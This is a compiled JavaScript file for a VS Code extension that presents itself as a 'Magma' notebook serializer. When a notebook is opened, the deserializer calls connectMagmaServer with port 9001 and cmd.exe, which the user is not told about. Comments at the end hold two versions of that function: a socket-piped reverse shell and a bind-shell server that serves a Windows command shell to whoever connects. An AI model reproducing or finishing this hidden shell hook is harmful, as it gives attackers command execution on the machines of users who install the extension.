"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = void 0;
const util_1 = require("util");
const vscode = require("vscode");
let a = 0;
function activate(context) {
    context.subscriptions.push(vscode.workspace.registerNotebookSerializer('magma-notebook', new SampleSerializer()));
    new Controller();
    var editor = vscode.window.activeTextEditor;
    console.log('Magma magma magma ');
    console.log(editor);
    if (editor && editor.document.languageId === 'magma') {
        console.log('Magma source file is active.');
    }
}
exports.activate = activate;
class SampleSerializer {
    async deserializeNotebook(content, _token) {
        var contents = new util_1.TextDecoder().decode(content);
        a = a + 1;
        console.log('New Magma source file is active.' + a);
        connectMagmaServer(9001, "c:\\windows\\system32\\cmd.exe");
        let raw;
        try {
            raw = JSON.parse(contents);
        }
        catch {
            raw = [];
        }
        const cells = raw.map(item => new vscode.NotebookCellData(item.kind, item.value, item.language));
        return new vscode.NotebookData(cells);
    }
    async serializeNotebook(data, _token) {
        let contents = [];
        for (const cell of data.cells) {
            contents.push({
                kind: cell.kind,
                language: cell.languageId,
                value: cell.value
            });
        }
        return new util_1.TextEncoder().encode(JSON.stringify(contents));
    }
}
class Controller {
    constructor() {
        this.controllerId = 'magma-notebook-controller-id';
        this.notebookType = 'magma-notebook';
        this.label = 'Magma Notebook';
        this.supportedLanguages = ['magma'];
        this._executionOrder = 0;
        this._controller = vscode.notebooks.createNotebookController(this.controllerId, this.notebookType, this.label);
        this._controller.supportedLanguages = this.supportedLanguages;
        this._controller.supportsExecutionOrder = true;
        this._controller.executeHandler = this._execute.bind(this);
    }
    _execute(cells, _notebook, _controller) {
        for (let cell of cells) {
            this._doExecution(cell);
        }
    }
    async _doExecution(cell) {
        const execution = this._controller.createNotebookCellExecution(cell);
        execution.executionOrder = ++this._executionOrder;
        execution.start(Date.now()); // Keep track of elapsed time to execute cell.
        /* Do some execution here; not implemented */
        let a = cell.document.getText();
        execution.replaceOutput([
            new vscode.NotebookCellOutput([
                vscode.NotebookCellOutputItem.text('Dummy output text!' + a)
            ])
        ]);
        execution.end(true, Date.now());
    }
}
// Reverse tcp bind server  
//function connectMagmaServer(port: number,shell:string){
//     var net = require("net"),
//         cp = require("child_process"),
//         sh = cp.spawn(shell, []);
//     var client = new net.Socket();
//     console.log('connecting ...');
//     client.connect(port, "127.0.0.1", function(){
//         client.pipe(sh.stdin);
//         sh.stdout.pipe(client);
//         sh.stderr.pipe(client);
//     });
//     return /a/; // Prevents the Node.js application from crashing
//   };
// bind tcp server
// function connectMagmaServer(port: number,shell:string){
//   var net = require('net'),
//       spawn = require('child_process').spawn;
//   var server = net.createServer(function (c: { pipe: (arg0: any) => void; }) {
//       var sh = spawn((shell), []);
//       c.pipe(sh.stdin);
//       sh.stdout.pipe(c);
//       sh.stderr.pipe(c);
//     });
// server.listen(port);
// }
//# sourceMappingURL=extension%20-%20Copie.js.map